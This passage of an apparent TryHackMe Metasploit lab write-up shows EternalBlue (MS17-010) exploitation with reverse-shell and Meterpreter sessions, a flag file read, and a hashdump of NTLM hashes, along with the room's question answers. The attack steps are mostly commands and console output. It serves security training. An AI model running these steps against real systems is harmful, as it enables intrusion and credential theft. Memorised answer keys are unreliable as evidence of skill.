  https://nvd.nist.gov/vuln/detail/CVE-1999-0506


View the full module info with the info -d command.
```

As you can see, the vnc_login module can help us find login details for the VNC service.

### Question 1:
Who wrote the module that allows us to check SMTP servers for open relay?

**Answer:** Campbell Murray

```bash
msf6 auxiliary(scanner/smtp/smtp_relay) > info

       Name: SMTP Open Relay Detection
     Module: auxiliary/scanner/smtp/smtp_relay
    License: Metasploit Framework License (BSD)
       Rank: Normal

Provided by:
  Campbell Murray
  xistence <xistence@0x90.nl>

Check supported:
  No

Basic options:
  Name      Current Setting     Required  Description
  ----      ---------------     --------  -----------
  EXTENDED  false               yes       Do all the 16 extended checks
  MAILFROM  sender@example.com  yes       FROM address of the e-mail
  MAILTO    target@example.com  yes       TO address of the e-mail
  RHOSTS                        yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
  RPORT     25                  yes       The target port (TCP)
  THREADS   1                   yes       The number of concurrent threads (max one per host)

Description:
  This module tests if an SMTP server will accept (via a code 250)
  an e-mail by using a variation of testing methods.
  Some of the extended methods will try to abuse configuration or mailserver flaws.

References:
  http://www.ietf.org/rfc/rfc2821.txt
  https://svn.nmap.org/nmap/scripts/smtp-open-relay.nse


View the full module info with the info -d command.
```

## Task 5 Exploitation
As the name suggests, Metasploit is an exploitation framework. Exploits are the most populated module category.

**Metasploit version details**
```bash
      =[ metasploit v5.0.101-dev]
+ -- --=[ 2048 exploits - 1105 auxiliary - 344 post]
+ -- --=[ 562 payloads - 45 encoders - 10 nops]
+ -- --=[ 7 evasion]
```

You can search exploits using the search command, obtain more information about the exploit using the info command, and launch the exploit using exploit. While the process itself is simple, remember that a successful outcome depends on a thorough understanding of services running on the target system.

Most of the exploits will have a preset default payload. However, you can always use the show payloads command to list other commands you can use with that specific exploit.

**Available payloads**
```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > show payloads 

Compatible Payloads
===================

   #   Name                                        Disclosure Date  Rank    Check  Description
   -   ----                                        ---------------  ----    -----  -----------
   0   generic/custom                                               manual  No     Custom Payload
   1   generic/shell_bind_tcp                                       manual  No     Generic Command Shell, Bind TCP Inline
   2   generic/shell_reverse_tcp                                    manual  No     Generic Command Shell, Reverse TCP Inline
   3   windows/x64/exec                                             manual  No     Windows x64 Execute Command
   4   windows/x64/loadlibrary                                      manual  No     Windows x64 LoadLibrary Path
   5   windows/x64/messagebox                                       manual  No     Windows MessageBox x64
   6   windows/x64/meterpreter/bind_ipv6_tcp                        manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager
   7   windows/x64/meterpreter/bind_ipv6_tcp_uuid                   manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager with UUID Support
   8   windows/x64/meterpreter/bind_named_pipe                      manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind Named Pipe Stager
   9   windows/x64/meterpreter/bind_tcp                             manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind TCP Stager
   10  windows/x64/meterpreter/bind_tcp_rc4  
```

Once we have decided on the payload, we can use the set payload command to make our choice.

**Payload options**
```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload 2
payload => generic/shell_reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options 

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Payload options (generic/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs


msf6 exploit(windows/smb/ms17_010_eternalblue) >
```

Note that choosing a working payload could become a trial and error process due to environmental or OS restrictions such as firewall rules, anti-virus, file writing, or the program performing the payload execution isn't available (eg. payload/python/shell_reverse_tcp).

Some payloads will open new parameters that you may need to set, running the show options command once more can show these. As you can see in the above example, a reverse payload will at least require you to set the LHOST option.

**Setting the LHOST value and running the exploit**
```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > set lhost 10.10.186.44
lhost => 10.10.186.44
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit 

[*] Started reverse TCP handler on 10.10.186.44:4444 
[*] 10.10.12.229:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.12.229:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.12.229:445      - Scanned 1 of 1 hosts (100% complete)
[*] 10.10.12.229:445 - Connecting to target for exploitation.
[+] 10.10.12.229:445 - Connection established for exploitation.
[+] 10.10.12.229:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.12.229:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.12.229:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.12.229:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.12.229:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.12.229:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.12.229:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.12.229:445 - Sending all but last fragment of exploit packet
[*] 10.10.12.229:445 - Starting non-paged pool grooming
[+] 10.10.12.229:445 - Sending SMBv2 buffers
[+] 10.10.12.229:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.12.229:445 - Sending final SMBv2 buffers.
[*] 10.10.12.229:445 - Sending last fragment of exploit packet!
[*] 10.10.12.229:445 - Receiving response from exploit packet
[+] 10.10.12.229:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.12.229:445 - Sending egg to corrupted connection.
[*] 10.10.12.229:445 - Triggering free of corrupted buffer.
[*] Command shell session 1 opened (10.10.186.44:4444 -> 10.10.12.229:49366) at 2021-08-20 04:51:19 +0100
C:\Windows\system32>
```

Once a session is opened, you can background it using CTRL+Z or abort it using CTRL+C. Backgrounding a session will be useful when working on more than one target simultaneously or on the same target with a different exploit and/or shell.

**Backgrounding the session**
```bash
C:\Windows\system32>^Z
Background session 1? [y/N]  y
msf6 exploit(windows/smb/ms17_010_eternalblue) > sessions

Active sessions
===============

  Id  Name  Type               Information                                                                       Connection
  --  ----  ----               -----------                                                                       ----------
  1         shell x64/windows  Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation...  10.10.186.44:4444 -> 10.10.12.229:49366 (10.10.12.229)

msf6 exploit(windows/smb/ms17_010_eternalblue) >
```

### Working with sessions
The sessions command will list all active sessions. The sessions command supports a number of options that will help you manage sessions better.

**Sessions help menu**
```bash
sf6 exploit(windows/smb/ms17_010_eternalblue) > sessions -h
Usage: sessions [options] or sessions [id]

Active session manipulation and interaction.

OPTIONS:

    -C   Run a Meterpreter Command on the session given with -i, or all
    -K        Terminate all sessions
    -S   Row search filter.
    -c   Run a command on the session given with -i, or all
    -d        List all inactive sessions
    -h        Help banner
    -i   Interact with the supplied session ID
    -k   Terminate sessions by session ID and/or range
    -l        List all active sessions
    -n   Name or rename a session by ID
    -q        Quiet mode
    -s   Run a script or module on the session given with -i, or all
    -t   Set a response timeout (default: 15)
    -u   Upgrade a shell to a meterpreter session on many platforms
    -v        List all active sessions in verbose mode
    -x        Show extended information in the session table

Many options allow specifying session ranges using commas and dashes.
For example:  sessions -s checkvm -i 1,3-5  or  sessions -k 1-2,5,6

msf6 exploit(windows/smb/ms17_010_eternalblue) >
```

You can interact with any existing session using the sessions -i command followed by the session ID.

**Interacting with sessions**
```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > sessions 

Active sessions
===============

  Id  Name  Type               Information                                                                       Connection
  --  ----  ----               -----------                                                                       ----------
  1         shell x64/windows  Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation...  10.10.186.44:4444 -> 10.10.12.229:49366 (10.10.12.229)

msf6 exploit(windows/smb/ms17_010_eternalblue) > sessions -i 1
[*] Starting interaction with 1...

C:\Windows\system32>
```

Answer the questions below:

### Question 1:
Exploit one of the critical vulnerabilities on the target VM

**Answer:** No answer needed

```bash
msf6 > search MS17-010

Matching Modules
================

   #   Name                                           Disclosure Date  Rank     Check  Description
   -   ----                                           ---------------  ----     -----  -----------
   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1     \_ target: Automatic Target                  .                .        .      .
   2     \_ target: Windows 7                         .                .        .      .
   3     \_ target: Windows Embedded Standard 7       .                .        .      .
   4     \_ target: Windows Server 2008 R2            .                .        .      .
   5     \_ target: Windows 8                         .                .        .      .
   6     \_ target: Windows 8.1                       .                .        .      .
   7     \_ target: Windows Server 2012               .                .        .      .
   8     \_ target: Windows 10 Pro                    .                .        .      .
   9     \_ target: Windows 10 Enterprise Evaluation  .                .        .      .
   10  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   11    \_ target: Automatic                         .                .        .      .
   12    \_ target: PowerShell                        .                .        .      .
   13    \_ target: Native upload                     .                .        .      .
   14    \_ target: MOF upload                        .                .        .      .
   15    \_ AKA: ETERNALSYNERGY                       .                .        .      .
   16    \_ AKA: ETERNALROMANCE                       .                .        .      .
   17    \_ AKA: ETERNALCHAMPION                      .                .        .      .
   18    \_ AKA: ETERNALBLUE                          .                .        .      .
   19  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   20    \_ AKA: ETERNALSYNERGY                       .                .        .      .
   21    \_ AKA: ETERNALROMANCE                       .                .        .      .
   22    \_ AKA: ETERNALCHAMPION                      .                .        .      .
   23    \_ AKA: ETERNALBLUE                          .                .        .      .
   24  auxiliary/scanner/smb/smb_ms17_010             .                normal   No     MS17-010 SMB RCE Detection
   25    \_ AKA: DOUBLEPULSAR                         .                .        .      .
   26    \_ AKA: ETERNALBLUE                          .                .        .      .
   27  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
   28    \_ target: Execute payload (x64)             .                .        .      .
   29    \_ target: Neutralize implant                .                .        .      .


Interact with a module by name or index. For example info 29, use 29 or use exploit/windows/smb/smb_doublepulsar_rce
After interacting with a module you can manually set a TARGET with set TARGET 'Neutralize implant'
```
use 0 option
```bash
msf6 > use 0
[*] Using configured payload windows/x64/meterpreter/reverse_tcp
```
Set RHOSTS machine IP
Set LHOST attacker's IP
```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 10.10.135.20
rhosts => 10.10.135.20
msf6 exploit(windows/smb/ms17_010_eternalblue) > set lhosts 10.10.224.224
[!] Unknown datastore option: lhosts. Did you mean LHOST?
lhosts => 10.10.224.224
msf6 exploit(windows/smb/ms17_010_eternalblue) > 
```

run
```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > run
[*] Started reverse TCP handler on 10.10.224.244:4444 
[*] 10.10.135.20:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.135.20:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.135.20:445      - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.135.20:445 - The target is vulnerable.
[*] 10.10.135.20:445 - Connecting to target for exploitation.
[+] 10.10.135.20:445 - Connection established for exploitation.
[+] 10.10.135.20:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.135.20:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.135.20:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.135.20:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.135.20:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.135.20:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.135.20:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.135.20:445 - Sending all but last fragment of exploit packet
[*] 10.10.135.20:445 - Starting non-paged pool grooming
[+] 10.10.135.20:445 - Sending SMBv2 buffers
[+] 10.10.135.20:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.135.20:445 - Sending final SMBv2 buffers.
[*] 10.10.135.20:445 - Sending last fragment of exploit packet!
[*] 10.10.135.20:445 - Receiving response from exploit packet
[+] 10.10.135.20:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.135.20:445 - Sending egg to corrupted connection.
[*] 10.10.135.20:445 - Triggering free of corrupted buffer.
[*] Sending stage (203846 bytes) to 10.10.135.20
[*] Meterpreter session 1 opened (10.10.224.244:4444 -> 10.10.135.20:49177) at 2025-05-24 19:42:35 +0100
[+] 10.10.135.20:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.135.20:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.135.20:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter >
```


### Question 2:
What is the content of the flag.txt file?

**Answer:** THM-5455554845

Search flag.txt
```bash
meterpreter > search -f flag.txt
Found 1 result...
=================

Path                             Size (bytes)  Modified (UTC)
----                             ------------  --------------
c:\Users\Jon\Documents\flag.txt  15            2021-07-15 03:39:25 +0100
```

```bash
meterpreter > cd /Users/Jon/Documents
meterpreter > pwd
C:\Users\Jon\Documents
meterpreter > ls
Listing: C:\Users\Jon\Documents
===============================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040777/rwxrwxrwx  0     dir   2018-12-13 03:13:31 +0000  My Music
040777/rwxrwxrwx  0     dir   2018-12-13 03:13:31 +0000  My Pictures
040777/rwxrwxrwx  0     dir   2018-12-13 03:13:31 +0000  My Videos
100666/rw-rw-rw-  402   fil   2018-12-13 03:13:48 +0000  desktop.ini
100666/rw-rw-rw-  15    fil   2021-07-15 03:39:25 +0100  flag.txt

meterpreter > cat flag.txt
THM-5455554845
meterpreter > 
```

### Question 3:
What is the NTLM hash of the password of the user "pirate"?

**Answer:** 8ce9a3ebd1647fcc5e04025019f4b875

```bash
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
pirate:1001:aad3b435b51404eeaad3b435b51404ee:8ce9a3ebd1647fcc5e04025019f4b875:::
meterpreter > 
```

